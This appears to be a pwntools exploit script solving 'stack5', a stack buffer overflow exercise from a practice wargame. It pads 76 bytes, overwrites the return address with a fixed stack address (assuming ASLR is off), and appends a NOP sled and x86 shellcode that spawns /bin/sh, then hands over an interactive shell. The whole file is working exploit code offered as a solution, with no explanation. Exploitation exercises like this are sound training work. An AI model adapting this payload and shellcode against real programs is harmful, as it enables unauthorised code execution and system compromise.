from pwn import *

context.log_level = 'debug'

f = 'stack5'
p = process('../problems/' + f)
b = ELF('../problems/' + f)

padding = 'A'*76
ret = p32(0xffffd260)  # turn off ASLR
nop = '\x90'*200
shellcode =  "\x31\xc0\x50\x68\x2f\x2f\x73" + \
             "\x68\x68\x2f\x62\x69\x6e\x89" + \
             "\xe3\x89\xc1\x89\xc2\xb0\x0b" + \
             "\xcd\x80\x31\xc0\x40\xcd\x80"

payload = padding + ret + nop + shellcode

raw_input()

p.sendline(payload)

p.interactive()
